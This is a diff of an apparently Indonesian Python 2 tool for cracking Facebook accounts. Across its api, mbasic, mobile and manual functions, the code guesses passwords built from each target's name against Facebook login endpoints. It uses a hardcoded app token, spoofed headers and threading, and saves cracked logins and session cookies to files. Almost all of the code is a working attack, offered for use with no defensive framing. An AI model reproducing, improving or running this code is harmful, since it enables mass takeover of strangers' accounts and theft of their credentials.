+		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+	global loop, token
+	sys.stdout.write(
+		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	uid, name = user.split("<=>")
+	if len(name)>=6:
+		pwx = [ name, name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	elif len(name)<=2:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	elif len(name)<=3:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	else:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	try:
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+			param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
+			api = "https://b-api.facebook.com/method/auth.login"
+			send = ses.get(api, params=param, headers=headers_) 
+			if "session_key" in send.text and "EAAA" in send.text:
+				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				ok.append("%s|%s"%(uid, pw))
+				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+			elif "www.facebook.com" in send.json()["error_msg"]:
+				cek_ttl_cp(uid, pw)
+				break
+				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+
+		loop += 1
+	except:
+		pass
+
+def mbasic(user):
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
+		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+	global loop, token
+	sys.stdout.write(
+		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	uid, name = user.split("<=>")
+	if len(name)>=6:
+		pwx = [ name, name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	elif len(name)<=2:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	elif len(name)<=3:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	else:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	try:
+		for pw in pwx:
+			kwargs = {}
+			pw = pw.lower()
+			ses = requests.Session()
+			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
+			b = parser(p,"html.parser")
+			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+			for i in b("input"):
+				try:
+					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+					else:continue
+				except:pass
+			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
+			if "c_user" in ses.cookies.get_dict().keys():
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				ok.append("%s|%s"%(uid, pw))
+				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+			elif "checkpoint" in ses.cookies.get_dict().keys():
+				cek_ttl_cp(uid, pw)
+				break
+				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+
+		loop += 1
+	except:
+		pass
+
+def mobile(user):
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
+		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+	global loop, token
+	sys.stdout.write(
+		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	uid, name = user.split("<=>")
+	if len(name)>=6:
+		pwx = [ name, name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	elif len(name)<=2:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	elif len(name)<=3:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	else:
+		pwx = [ name+"123", name+"1234", name+"1", name+"12345", name+"786", name+"1122", name+"12", "pakistan", "pakistan1", "pakistan12", "pakistan123", "pakistan786", "pakistan1234" ]
+	try:
+		for pw in pwx:
+			kwargs = {}
+			pw = pw.lower()
+			ses = requests.Session()
+			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
+			b = parser(p,"html.parser")
+			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+			for i in b("input"):
+				try:
+					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+					else:continue
+				except:pass
+			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
+			if "c_user" in ses.cookies.get_dict().keys():
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				ok.append("%s|%s"%(uid, pw))
+				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+			elif "checkpoint" in ses.cookies.get_dict().keys():
+				cek_ttl_cp(uid, pw)
+				break
+				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+
+		loop += 1
+	except:
+		pass
 
 def manual():
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,indonesia")
-	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Set Password : ")
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
-	if len(pw) ==0:
-		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Don't Be Empty")
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
-	
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
+		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+	global loop, token
+	print("\n * contoh pass : sayang,anjing,bangsat")
+	asu = raw_input(" ? set pass : ").split(",")
+	if len(asu) =="":
+		exit(" ! jangan kosong")
+	print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
+	print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+
 	def main(user):
 		global loop, token
-		sys.stdout.write('\r \033[0;97m[\033[0;93m*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
+		sys.stdout.write(
+			"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
-		try:os.mkdir("results")
-		except OSError:pass
-		uid,name=user.split("<=>")
-		ss = name.split(" ")
+		uid, name = user.split("<=>")
 		try:
-			os.mkdir('results')
-		except OSError:
-			pass
-		try:
-			for asu in pw.split(","):
-				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
-				xo = rex.content
-				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '       ')
-					ok.append(uid+'|'+asu)
-					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
-					save.close()
-					break
-					continue
-				if 'checkpoint' in xo:
+			for pw in asu:
+				kwargs = {}
+				pw = pw.lower()
+				ses = requests.Session()
+				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
+				b = parser(p,"html.parser")
+				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+				for i in b("input"):
 					try:
-						token = open('login.txt').read()
-						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
-						data = s.get(url).json()
-						ttl = data['birthday'].replace("/","-")
-						print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '|' + ttl)
-						cp.append(uid+'|'+asu+'|'+ttl)
-						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
-						save.close()
-						break
-					except(KeyError, IOError):
-						ttl = " "
+						if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+						else:continue
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '       ')
-					cp.append(uid+'|'+asu)
-					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
-					save.close()
+				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
+				if "c_user" in ses.cookies.get_dict().keys():
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+					ok.append("%s|%s"%(uid, pw))
+					open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
-			
+				elif "checkpoint" in ses.cookies.get_dict().keys():
+					cek_ttl_cp(uid, pw)
+					break
+					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
+					cp.append("%s|%s"%(uid, pw))
+					open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
+					break
+					continue
+
 			loop += 1
 		except:
 			pass
-	p = ThreadPool(50)
+	p = ThreadPool(30)
 	p.map(main, id)
-	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
-	
-### SETTING UA
-def settua():
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Change User Agent? [Y/t] : ") 
-	if ask =="":
+	exit("\n\n # selesai...")
+
+def setting_ua():
+	print("\n 1 ganti user agent tools")
+	print(" 2 ganti user agent bawaan tools")
+	ua = raw_input("\n ? choose : ")
+	if ua =="":
 		menu()
-	elif ask == "y" or ask == "Y":
-		try:
-			print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type In Chrome Search : My User Agent")
-			ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] User Agent : ") 
-			save = open(".ua","w")
-			save.write(ua) 
-			save.close()
-			print(" \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
-			time.sleep(2)
-			menu()
-		except KeyboardInterrupt:
-			exit()
-	elif ask == "t" or ask == "T":
-		try:
-			ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
-			save = open(".ua","w")
-			save.write(ua) 
-			save.close()
-			print("\n \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
-			time.sleep(2)
-			menu()
-		except KeyboardInterrupt:
-			exit()
-	else:
+	elif ua == "1":
+		c_ua = raw_input(" + user agent : ")
+		open(".ua", "w").write(c_ua)
+		time.sleep(1)
+		raw_input("\n + berhasil ganti user agent")
+		menu()
+	elif ua == "2":
+		print(" + user agent : Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+		os.system("rm -f .ua")
+		time.sleep(1)
+		raw_input("\n + berhasil ganti user agent")
 		menu()
 
-if __name__ == '__main__':
-	if sys.version[0]!="3":
-		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
-	else:
-		print(" \033[0;97m[\033[0;93m#\033[0;97m] Please Use Python 2 Bro Not Python 3")
-		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
+def buat_folder():
+	try:os.mkdir("CP")
+	except:pass
+	try:os.mkdir("OK")
+	except:pass
+
+if __name__ == "__main__":
 	os.system("git pull")
+	os.system("touch login.txt")
+	buat_folder()
 	login()
